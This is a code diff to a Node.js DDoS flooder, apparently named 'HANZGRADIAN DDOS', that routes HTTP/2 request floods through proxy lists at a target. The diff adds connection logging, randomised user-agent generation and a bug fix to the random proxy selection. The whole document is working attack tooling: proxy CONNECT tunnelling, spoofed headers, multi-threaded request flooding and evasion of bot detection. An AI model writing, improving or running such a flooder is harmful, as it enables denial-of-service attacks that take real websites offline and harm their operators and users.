@@ -215,25 +215,19 @@ const secureOptions =
 const RESTART_DELAY = 1000;
 
 if (cluster.isMaster) {
-    console.log("═════════════════════════════════════════════════════════════".gray);
-    console.log(` HANZGRADIAN DDOS ATTACK`.red.bold);
-    console.log("═════════════════════════════════════════════════════════════".gray);
-    console.log(` >> Target       : `.brightYellow + process.argv[2]);
-    console.log(` >> Duration     : `.brightYellow + process.argv[3] + " seconds");
-    console.log(` >> Rate         : `.brightYellow + process.argv[4] + " req/s");
-    console.log(` >> Threads      : `.brightYellow + process.argv[5]);
-    console.log(` >> Proxy File   : `.brightYellow + process.argv[6]);
-    console.log("═════════════════════════════════════════════════════════════".gray);
-    console.log(` [!] Attack launched successfully`.brightRed);
-    console.log("═════════════════════════════════════════════════════════════".gray);
-    console.log("HANZGRADIAN DDOS | HIGH RQ/S GLORY CUSTOM".yellow.bold);
-    
+    console.log("Target: ".brightYellow + process.argv[2]);
+    console.log("Duration: ".brightYellow + process.argv[3] + " seconds");
+    console.log("Rate: ".brightYellow + process.argv[4] + " req/s");
+    console.log("Threads: ".brightYellow + process.argv[5]);
+    console.log("Proxy File: ".brightYellow + process.argv[6]);
+    console.log("Attack launched".brightRed);
+
     const restartScript = () => {
         for (const id in cluster.workers) {
             cluster.workers[id].kill();
         }
 
-        console.log(`[>] Restarting the script in ${RESTART_DELAY} ms...`.brightCyan);
+        console.log(`Restarting in ${RESTART_DELAY} ms...`.brightCyan);
         setTimeout(() => {
             for (let counter = 1; counter <= args.threads; counter++) {
                 cluster.fork();
@@ -248,7 +242,7 @@ if (cluster.isMaster) {
         const ramPercentage = (usedRAM / totalRAM) * 100;
 
         if (ramPercentage >= MAX_RAM_PERCENTAGE) {
-            console.log('[!] Maximum RAM usage:', ramPercentage.toFixed(2), '%');
+            console.log('Max RAM usage reached: '.yellow + ramPercentage.toFixed(2) + '%');
             restartScript();
         }
     };
@@ -266,7 +260,7 @@ if (cluster.isMaster) {
   HTTP(options, callback) {
      const parsedAddr = options.address.split(":");
      const addrHost = parsedAddr[0];
-     const payload = "CONNECT " + options.address + ":443 HTTP/1.1\r\nHost: " + options.address + ":443\r\nConnection: Keep-Alive\r\n\r\n"; //Keep Alive
+     const payload = "CONNECT " + options.address + ":443 HTTP/1.1\r\nHost: " + options.address + ":443\r\nConnection: Keep-Alive\r\n\r\n"; 
      const buffer = new Buffer.from(payload);
      const connection = net.connect({
         host: options.host,
@@ -325,7 +319,7 @@ return result;
   return Math.floor(Math.random() * (max - min + 1)) + min;
 }
  function randomElement(elements) {
-     return elements[randomIntn(0, elements.length)];
+     return elements[randomIntn(0, elements.length - 1)];
  }
  function randstrs(length) {
     const characters = "0123456789";
@@ -342,6 +336,7 @@ const randstrsValue = randstrs(10);
   function runFlooder() {
     const proxyAddr = randomElement(proxies);
     const parsedProxy = proxyAddr.split(":");
+    console.log(`Selected proxy: ${proxyAddr}`.green);
     const parsedPort = parsedTarget.protocol == "https:" ? "443" : "80";
     const nm = [
       "110.0.0.0",
@@ -498,7 +493,6 @@ const randstrsValue = randstrs(10);
         { "accept-language" : language_header[Math.floor(Math.random() * language_header.length)]},
         { "origin": "https://" + parsedTarget.host},
         { "source-ip": randstr(5)  },
-        //{"x-aspnet-version" : randstrsValue},
         { "data-return" :"false"},
         {"X-Forwarded-For" : parsedProxy[0]},
         {"NEL" : val},
@@ -521,7 +515,7 @@ let headers = {
   "sec-fetch-mode": fetch_mode[Math.floor(Math.random() * fetch_mode.length)],
   "sec-fetch-site": fetch_site[Math.floor(Math.random() * fetch_site.length)],
   "sec-fetch-dest": fetch_dest[Math.floor(Math.random() * fetch_dest.length)],
-  "user-agent" :  "/5.0 (" + nm2 + "; " + nm5 + "; " + nm3 + " ; " + kha +" " + nm4 + ") /Gecko/20100101 Edg/91.0.864.59 " + nm4,
+  "user-agent" : randomUA(),
 }
  const proxyOptions = {
      host: parsedProxy[0],
@@ -530,8 +524,12 @@ let headers = {
      timeout: 10
  };
  Socker.HTTP(proxyOptions, (connection, error) => {
-    if (error) return
+    if (error) {
+      console.log(`Proxy connection error: ${error}`.red);
+      return
+    }
 
+    console.log(`Connected via proxy: ${proxyAddr}`.blue);
     connection.setKeepAlive(true, 600000);
     connection.setNoDelay(true)
 
@@ -587,6 +585,7 @@ client.settings({
 client.setMaxListeners(0);
 client.settings(settings);
     client.on("connect", () => {
+      console.log(`HTTP/2 connected to ${parsedTarget.host}`.cyan);
        const IntervalAttack = setInterval(() => {
            for (let i = 0; i < args.Rate; i++) {
            
@@ -616,17 +615,20 @@ const request = client.request({
        }, 300);
     });
     client.on("close", () => {
+      console.log(`Connection closed`.yellow);
       client.destroy();
       tlsConn.destroy();
       connection.destroy();
       return
   });
   client.on("timeout", () => {
+    console.log(`Connection timeout`.red);
     client.destroy();
     connection.destroy();
     return
 });
   client.on("error", error => {
+console.log(`Client error: ${error}`.red);
 client.destroy();
 connection.destroy();
 return
@@ -640,3 +642,22 @@ setTimeout(StopScript, args.time * 1000);
 process.on('uncaughtException', error => {});
 process.on('unhandledRejection', error => {});
 
+function randomUA() {
+  const osPlatforms = [
+    'Windows NT 10.0; Win64; x64',
+    'Windows NT 6.1; Win64; x64',
+    'Macintosh; Intel Mac OS X 10_15_7',
+    'X11; Linux x86_64',
+    'X11; Ubuntu; Linux x86_64',
+    'iPhone; CPU iPhone OS 14_0 like Mac OS X'
+  ];
+  const browsers = [
+    'Chrome/114.0.0.0 Safari/537.36',
+    'Firefox/113.0',
+    'Safari/537.36',
+    'Edg/114.0.1823.58',
+    'OPR/99.0.0.0'
+  ];
+  const versions = Math.floor(Math.random() * 100) + '.' + Math.floor(Math.random() * 1000) + '.' + Math.floor(Math.random() * 100);
+  return `Mozilla/5.0 (${randomElement(osPlatforms)}) AppleWebKit/537.36 (KHTML, like Gecko) ${randomElement(browsers)} ${versions}`;
+}
